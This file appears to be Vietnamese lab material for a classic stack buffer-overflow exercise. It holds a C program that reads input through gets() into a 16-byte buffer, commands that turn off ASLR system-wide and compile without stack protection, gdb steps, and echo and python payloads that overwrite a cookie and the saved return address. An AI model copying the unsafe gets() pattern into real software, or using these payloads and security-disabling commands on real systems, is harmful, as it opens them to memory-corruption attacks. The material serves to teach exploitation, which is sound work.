#include <stdio.h>

int main() {
  int cookie = 0x2222;
  char buf[16];

  printf("&buf: %p, &cookie: %p\n", buf, &cookie);
  gets(buf);

  if (cookie == 0x000D0A00) {
    printf("You Win!\n");
  }
}

// sudo apt-get update
// sudo apt-get install libc6-dev-i386
// tải trình biên dịch 32 bit

//  #cat /proc/sys/kernel/randomize_va_space 
// #sudo bash -c 'echo "kernel.randomize_va_space = 0" >> /etc/sysctl.conf'
// ngắt tạm thời random địa chỉ : sudo sysctl -w kernel.randomize_va_space=0
// $ gcc -fno-stack-protector -mpreferred-stack-boundary=2 -m32 stack4.c -g -o stack4
// Nhập chuỗi đúng để ra được “You win!”
gdb stack4
run
break 2
run
n
x/22i main
// C1 Sử dụng echo và pipe (|):
// echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaa\000\003\002\000" | ./stack4
// C2 Sử dụng python để nhập chuỗi
// 

Lấp đầy buf 28
Lấp đầy cookie 
Lấp đầy ebp cũ
Ghi đè lên ô nhớ lưu
trữ EIP cũ với giá trị địa
chỉ của nhánh bằng
python -c 'print("a"*0x18 + "\xa3\x84\x04\x08")' | ./stack4

